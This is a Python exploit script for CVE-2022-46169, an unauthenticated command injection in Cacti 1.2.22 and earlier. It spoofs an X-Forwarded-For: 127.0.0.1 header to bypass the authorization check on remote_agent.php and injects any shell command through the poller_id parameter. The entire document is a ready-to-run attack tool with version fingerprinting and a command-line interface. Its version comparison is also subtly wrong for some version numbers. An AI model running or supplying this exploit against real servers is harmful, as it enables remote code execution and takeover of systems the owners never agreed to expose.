# CVE-2022-46169
# Product: Cacti
# Version: <= 1.2.22
# Vulnerability: Unauthenticated Command Injection

import requests
import re
import argparse

def exploit(target_ip, port, payload):
    target_url = f"http://{target_ip}:{port}/remote_agent.php"
    custom_headers = {
            "X-Forwarded-For": "127.0.0.1" # bypass remote_client_authorized
    }
    command_injection = f";{payload}"
    local_data_ids = list(range(1, 11))

    for host_id in range(1, 11): 
        request_params = {
                "action": "polldata",
                "local_data_ids[]": local_data_ids,
                "host_id": host_id,
                "poller_id": command_injection
        }
        res = requests.get(target_url,
                           params=request_params,
                           headers=custom_headers)
        if len(res.text) > 0:
            return True
    return False

def check(target_ip, port):
    try:
        res = requests.get(f"http://{target_ip}:{port}/index.php")
    except:
        return False

    ver_match = re.search(r"Version (\d+\.\d+\.\d+)", res.text)
    if ver_match is None:
        return False

    version = ver_match.group(1)
    ver_parts = map(int, version.split('.'))
    max_ver = [1, 2, 22]
    return not any((v, m) for v, m in zip(ver_parts, max_ver) if v > m)
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str, help="IP address of the target")
    parser.add_argument("--port", "-p", type=int, default=80, help="Port Cacti is using on the target (default 80)")
    parser.add_argument("payload", type=str, help="Command to run on the target")
    args = parser.parse_args()
    target_ip: str = args.ip
    port: int = args.port
    payload: str = args.payload
    print("Checking if target is vulnerable...")
    if not check(target_ip, port):
        print("Target does not appear to be vulnerable. Exiting.")
    else:
        print("Target appears vulnerable.")
        print("Attempting exploit...")
        success = exploit(target_ip, port, payload)
        if success:
            print("Exploit completed successfully!")
        else:
            print("Exploit failed.")
